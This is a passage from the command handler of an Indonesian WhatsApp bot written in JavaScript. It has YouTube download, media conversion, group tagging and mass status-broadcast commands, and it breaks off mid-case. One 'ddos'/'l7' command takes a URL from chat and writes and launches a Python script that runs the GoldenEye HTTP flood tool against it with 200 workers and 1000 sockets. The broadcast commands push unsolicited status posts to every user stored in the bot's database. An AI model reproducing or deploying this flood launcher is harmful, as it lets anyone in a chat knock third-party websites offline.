case 'listgc': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
                 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
                 for (let i of anulistg) {
                     let metadata = await Biiofc.groupMetadata(i)
                     teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 Biiofc.sendTextWithMentions(m.chat, teks, m)
             }
             break
		case 'ytsearch':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
		if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
			if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
			axios
				.get(`https://api.lolhuman.xyz/api/ytsearch?apikey=${apikey}&query=${command}`)
				.then(({ data }) => {
					var text = ''
					for (var x of data.result) {
						text += `Title : ${x.title}\n`
						text += `Views : ${x.views}\n`
						text += `Published : ${x.published}\n`
						text += `Thumbnail : ${x.thumbnail}\n`
						text += `Link : https://www.youtube.com/watch?v=${x.videoId}\n\n`
					}
					reply(text)
				})
				.catch(console.error)
			break
		case 'ytmp3':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
		if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
			if (args.length == 0) return reply(`Example: ${prefix + command} https://youtu.be/VDvFcn6icXo`)
			axios
				.get(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${apikey}&url=${args[0]}`)
				.then(({ data }) => {
					var caption = `❖ Title    : *${data.result.title}*\n`
					caption += `❖ Size     : *${data.result.size}*`
					Biiofc.sendMessage(from, { image: { url: data.result.thumbnail }, caption }).then(() => {
						Biiofc.sendMessage(from, { audio: { url: data.result.link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3` })
					})
				})
				.catch(console.error)
			break
		case 'ytmp4':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
		if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
			if (args.length == 0) return reply(`Example: ${prefix + command} https://youtu.be/VDvFcn6icXo`)
			axios
				.get(`https://api.lolhuman.xyz/api/ytvideo2?apikey=${apikey}&url=${args[0]}`)
				.then(({ data }) => {
					Biiofc.sendMessage(from, { video: { url: data.result }, mimetype: 'video/mp4', caption : `silahkan ketik tovn atau to audio untuk merubah nya menjadi audio / vn`})
					})
				.catch(console.error)
			break
case 'vnsw':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!text) return reply(`masukin text nya yang ada di database listvn`)
var huy = fs.readFileSync(`./database/Audio/${text}.mp3`)
Biiofc.sendMessage('status@broadcast', {audio: huy, mimetype: 'audio/mp4', ptt:true},{
backgroundColor: '#FF000000',
statusJidList: pengguna
});
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break


case 'inisw':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!text) return reply(`masukin text nya yang ada di database listvn`)
var buu = fs.readFileSync(`./database/Audio/${text}.mp3`)
Biiofc.sendMessage('status@broadcast', {audio: buu, mimetype:'audio/mp4', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6283183432282',
title: `graze`,
sourceUrl: `https://wa.me/6283183432282`, 
thumbnail: thumb}}},{
backgroundColor: '#FF000000',
statusJidList: pengguna
});
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
case "buatswvideo":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
 if (!quoted) throw `Balas video Dengan Caption ${prefix + command}`
if (!/video/.test(mime)) throw `Balas video dengan caption *${prefix + command}*`
const media = await Biiofc.downloadAndSaveMediaMessage(quoted)
Biiofc.sendMessage('status@broadcast', { video: { url: media }}, {statusJidList: pengguna})
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
case 'swin':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!text) return reply(`masukin text nya`)
Biiofc.sendMessage('status@broadcast', {
text: `${text}`
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: pengguna
});
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
case "tagall": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isBotAdmins) return reply(mess.only.badmin)
if (!isGroup) return reply(mess.only.group)
if (!q) return reply(`Teks nya mana mek ?`)
let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n⌜ TAGG KABEHAN BY DE4YOU OFFCIAL ⌟\n`
for (let mem of participants) {
teks += `⊝ @${mem.id.split('@')[0]}\n`
}
Biiofc.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case "buatswimage":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
 if (!quoted) throw `Balas image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Balas image dengan caption *${prefix + command}*`
const media = await Biiofc.downloadAndSaveMediaMessage(quoted)
Biiofc.sendMessage('status@broadcast', { image: { url: media }}, {statusJidList: pengguna})
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
case 'buatsw':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
let men = [];
for (let x of pengguna) {
men.push(x)
const result = [ x ]
if (!m.quoted && !text) throw 'reply pesan'
if (m.quoted && m.quoted.mtype === 'conversation' && !text) _m = Biiofc.sendMessage('status@broadcast', {
text: m.quoted.text,
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: result
});
if (!m.quoted && text) _m = Biiofc.sendMessage('status@broadcast', {
text,
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: result
});
}
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
case 'ffstalk':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!q) return reply(`Example ${prefix+command} 946716486`)
eeh = await ffstalk.ffstalk(`${q}`)
reply(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
case 'ddos': case 'l7': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isOwner) return reply('Maaf, domain ini hanya untuk pemilik.')
    if (args.length < 1) return reply('_Mohon masukkan link dengan benar.._');

    const url = args[0];
    const options = `-w 200 -s 1000`;

    const pythonScript = `
import subprocess

command = "python3 goldeneye.py ${url} ${options}"
output = subprocess.getoutput(command)
print(output)
    `;

    const { writeFile, unlink } = require('fs');
    const { spawn } = require('child_process');

    const scriptPath = './goldeneye.py';
    writeFile(scriptPath, pythonScript, (err) => {
        if (err) {
            reply('Terjadi kesalahan saat menulis skrip Python.');
            return;
        }

        const process = spawn('python3', [scriptPath]);

        let output = '';
        let error = '';

        process.stdout.on('data', (data) => {
            output += data.toString();
        });

        process.stderr.on('data', (data) => {
            error += data.toString();
        });

        process.on('close', (code) => {
            unlink(scriptPath, () => {}); // Hapus skrip sementara setelah digunakan

            if (error) {
                reply('Terjadi kesalahan saat menjalankan skrip Python:\n' + error);
            } else {
                reply('Hasil:\n' + output);
            }
        });
    });
}
break
case 'toaud': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await Biiofc.downloadMediaMessage(quoted)
let { toAudio } = require('./freya/converter')
let audio = await toAudio(media, 'mp4')
Biiofc.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break
case 'tovn': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
reply('*Sabar Cuy Loading*')
let media = await quoted.download()
let { toPTT } = require('./freya/converter')
let audio = await toPTT(media, 'mp4')
Biiofc.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6283183432282',
title: `De4you Offcial`,
sourceUrl: `https://wa.me/6283183432282`, 
thumbnail: thumb
}
}})
}
break
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
  let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
  if (!/image/.test(mime)) throw respond
  if (!text) throw respond
  reply(`Proses Tuan...`)
  let atas = text.split('|')[0] ? text.split('|')[0] : '-'
  let bawah = text.split('|')[1] ? text.split('|')[1] : '-'
  let { TelegraPh } = require('./freya/uploader')
  try {
  let mee = await Biiofc.downloadAndSaveMediaMessage(quoted)
  let mem = await TelegraPh(mee)
  let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
  let awikwok = await Biiofc.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.author })
  await fs.unlinkSync(awikwok)
  } catch (e) {
  reply(`Sedang Maintenance Tuan`)
  }
  }
  break 
case 'togif': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./freya/uploader')
